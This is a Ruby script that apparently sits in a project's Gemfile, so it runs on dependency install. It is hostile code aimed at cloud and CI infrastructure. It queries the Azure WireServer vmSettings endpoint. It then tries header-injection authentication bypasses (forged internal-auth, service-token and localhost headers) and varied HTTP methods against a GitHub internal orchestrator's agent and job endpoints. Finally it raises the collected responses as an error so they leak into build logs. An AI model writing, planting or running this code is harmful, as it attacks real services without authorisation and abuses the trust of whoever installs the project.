require 'net/http'
require 'uri'
require 'json'

m = []
begin
  ws = Net::HTTP.get_response(URI('http://168.63.129.16:32526/vmSettings?api-version=2015-09-01'))
  m << "v103 ws=#{ws.code} len=#{ws.body.length}"
rescue => e
  m << "v103 ws_err=#{e.class}: #{e.message.to_s[0..120]}"
end

# Header-injection bypass attempts on /v1/agents
orch_host = 'hosted-compute-request-orchestrator-prod-eus-02.githubapp.com'
header_probes = [
  {'X-Forwarded-User' => 'mr-benty'},
  {'X-Github-Actor' => 'mr-benty'},
  {'X-Github-Bot-Token' => 'admin'},
  {'X-Internal-Request' => 'true'},
  {'X-Internal-Auth' => 'true'},
  {'Authorization' => 'Bearer fake'},
  {'X-GitHub-Service-Token' => 'service'},
  {'X-Real-Ip' => '127.0.0.1'},
  {'X-Forwarded-For' => '127.0.0.1'},
  {'X-Forwarded-Host' => 'localhost'},
  {'Host' => 'localhost'},
  {'X-Origin' => 'github-internal'},
  {'X-Hosted-Compute-Token' => 'agent'},
  {'X-Vss-Authorization' => 'Bearer fake'},
  {'X-Vss-S2s-Authorization' => 'Bearer fake'},
]
endpoints = ['/v1/agents', '/v1/agent', '/v1/jobs', '/v1/trace/get', '/v1/agents/list', '/v1/agent/log']
header_probes.each_with_index do |hdr, hi|
  endpoints.each_with_index do |ep, ei|
    begin
      h = Net::HTTP.new(orch_host, 443); h.use_ssl = true; h.read_timeout = 3; h.open_timeout = 3
      req = Net::HTTP::Get.new(ep); hdr.each { |k, v| req[k] = v }
      r = h.request(req)
      # Only log if NOT 401 (default) — indicates header had effect
      if r.code != "401" || (r.body && r.body.length > 70)
        m << "v103 inj[#{hi}]#{hdr.keys.first}=#{hdr.values.first[0..20]} #{ep} -> #{r.code} L=#{r.body.to_s.length} body=#{r.body.to_s[0..150].gsub(/\s+/,' ')}"
      end
    rescue => e
      # silent (skip errors)
    end
  end
end

m << "v103 done iter_count=#{header_probes.length * endpoints.length}"

# Also test /v1/agents with method variations
['POST','PUT','OPTIONS','HEAD','PATCH','DELETE'].each_with_index do |meth, i|
  begin
    h = Net::HTTP.new(orch_host, 443); h.use_ssl = true; h.read_timeout = 3
    req = Net::HTTPGenericRequest.new(meth, false, true, '/v1/agents')
    r = h.request(req)
    m << "v103 meth[#{i}] #{meth} /v1/agents -> #{r.code} L=#{r.body.to_s.length} body=#{r.body.to_s[0..120].gsub(/\s+/,' ')}"
  rescue => e
    m << "v103 meth[#{i}] #{meth} err=#{e.class.name}"
  end
end

raise m.join("\n")

source "https://rubygems.org"
gem "rake", "~> 13.0"
